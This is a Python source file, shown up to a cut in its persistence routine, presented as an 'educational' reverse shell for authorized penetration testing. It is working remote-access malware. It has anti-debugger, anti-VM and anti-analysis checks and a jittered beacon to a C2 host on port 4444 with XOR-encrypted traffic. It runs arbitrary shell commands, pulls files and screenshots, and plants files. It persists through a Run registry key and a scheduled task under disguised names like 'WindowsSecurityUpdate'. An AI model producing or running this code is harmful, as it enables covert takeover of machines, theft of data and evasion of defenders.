#!/usr/bin/env python3
"""
Demonstrates C2 communication, persistence, and anti-analysis
FOR AUTHORIZED PENETRATION TESTING ONLY
"""

import socket
import subprocess
import os
import sys
import time
import base64
import random
import threading
from datetime import datetime

class ReverseShell:
    """
    Educational reverse shell demonstrating attacker C2 techniques
    """
    
    def __init__(self, c2_host="127.0.0.1", c2_port=4444):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.socket = None
        self.connected = False
        self.beacon_interval = 30  # seconds
        self.jitter = 5  # random delay
        
    def anti_analysis(self):
        """
        Anti-analysis and evasion techniques
        """
        checks = []
        
        # Check for debugger
        if sys.platform == "win32":
            import ctypes
            kernel32 = ctypes.windll.kernel32
            if kernel32.IsDebuggerPresent():
                checks.append("debugger")
        
        # Check for VM
        vm_indicators = [
            "vmtoolsd.exe", "vmwaretray.exe", "vboxservice.exe",
            "xenservice.exe", "qemu-ga.exe"
        ]
        for indicator in vm_indicators:
            if sys.platform == "win32":
                result = subprocess.run(["tasklist"], capture_output=True, text=True)
                if indicator in result.stdout.lower():
                    checks.append("vm")
                    break
        
        # Check for sandbox (low resource)
        if os.cpu_count() < 2:
            checks.append("low_cpu")
        
        # Check for analysis tools
        analysis_tools = ["wireshark", "process hacker", "x64dbg", "ollydbg"]
        for tool in analysis_tools:
            result = subprocess.run(["tasklist"] if sys.platform == "win32" else ["ps", "aux"],
                                  capture_output=True, text=True)
            if tool in result.stdout.lower():
                checks.append("analysis_tool")
        
        if checks:
            print(f"[!] Analysis environment detected: {checks}")
            # In real malware: exit or take alternate path
            return False
        return True
    
    def obfuscate_command(self, command: str) -> str:
        """Simple command obfuscation"""
        # Base64 encode
        encoded = base64.b64encode(command.encode()).decode()
        return f"echo {encoded} | base64 -d | sh"
    
    def encrypt_communication(self, data: bytes) -> bytes:
        """Simple XOR encryption for C2 traffic"""
        key = b"EDUCATIONAL_KEY_"
        encrypted = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
        return encrypted
    
    def decrypt_communication(self, data: bytes) -> bytes:
        """Decrypt C2 traffic (XOR is symmetric)"""
        return self.encrypt_communication(data)  # XOR is its own inverse
    
    def connect_to_c2(self):
        """Establish connection to C2 server"""
        while not self.connected:
            try:
                # Random delay for evasion
                delay = self.beacon_interval + random.randint(-self.jitter, self.jitter)
                time.sleep(delay)
                
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((self.c2_host, self.c2_port))
                self.connected = True
                
                # Send initial beacon
                hostname = os.environ.get('COMPUTERNAME', os.uname().nodename)
                user = os.environ.get('USERNAME', os.environ.get('USER'))
                beacon = f"[+] Connection established from {hostname}/{user}\n"
                self.socket.send(self.encrypt_communication(beacon.encode()))
                
            except Exception as e:
                self.connected = False
                time.sleep(self.beacon_interval)
    
    def execute_command(self, command: str) -> str:
        """Execute received command"""
        try:
            # Common shell commands
            if command.startswith("cd "):
                os.chdir(command[3:])
                return f"Changed directory to {os.getcwd()}"
            
            elif command == "pwd":
                return os.getcwd()
            
            elif command == "whoami":
                return os.environ.get('USERNAME', os.environ.get('USER', 'unknown'))
            
            elif command == "sysinfo":
                import platform
                info = {
                    'os': platform.system(),
                    'release': platform.release(),
                    'machine': platform.machine(),
                    'processor': platform.processor(),
                    'hostname': platform.node()
                }
                return str(info)
            
            elif command.startswith("download "):
                filepath = command[9:]
                if os.path.exists(filepath):
                    with open(filepath, 'rb') as f:
                        return f"FILE_DATA:{base64.b64encode(f.read()).decode()}"
                return "File not found"
            
            elif command.startswith("upload "):
                # Parse upload data
                parts = command.split(' ', 2)
                if len(parts) >= 3:
                    filename = parts[1]
                    data = base64.b64decode(parts[2])
                    with open(filename, 'wb') as f:
                        f.write(data)
                    return f"Uploaded {filename}"
            
            elif command == "screenshot":
                # Capture screenshot
                try:
                    from PIL import ImageGrab
                    screenshot = ImageGrab.grab()
                    import io
                    img_buffer = io.BytesIO()
                    screenshot.save(img_buffer, format='PNG')
                    return f"SCREENSHOT:{base64.b64encode(img_buffer.getvalue()).decode()}"
                except:
                    return "Screenshot failed"
            
            elif command == "persistence":
                return self.establish_persistence()
            
            elif command == "migrate":
                # Process migration (simplified)
                return "Process migration would occur here"
            
            else:
                # Execute system command
                result = subprocess.run(command, shell=True, capture_output=True,
                                     text=True, timeout=30)
                output = result.stdout
                if result.stderr:
                    output += "\n" + result.stderr
                return output if output else "Command executed (no output)"
                
        except subprocess.TimeoutExpired:
            return "Command timed out"
        except Exception as e:
            return f"Error: {str(e)}"
    
    def establish_persistence(self):
        """Establish persistence on system"""
        methods = []
        
        if sys.platform == "win32":
            # Registry Run key
            try:
                import winreg
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
                script_path = os.path.abspath(sys.argv[0])
                winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, f"python {script_path}")
                winreg.CloseKey(key)
                methods.append("registry")
            except:
                pass
            
            # Scheduled task
            try:
                cmd = f'schtasks /create /tn "SecurityScan" /tr "python {os.path.abspath(sys.argv[0])}" /sc onlogon /f'
                os.system(cmd)
                methods.append("scheduled_task")
            except:
                pass
            
           
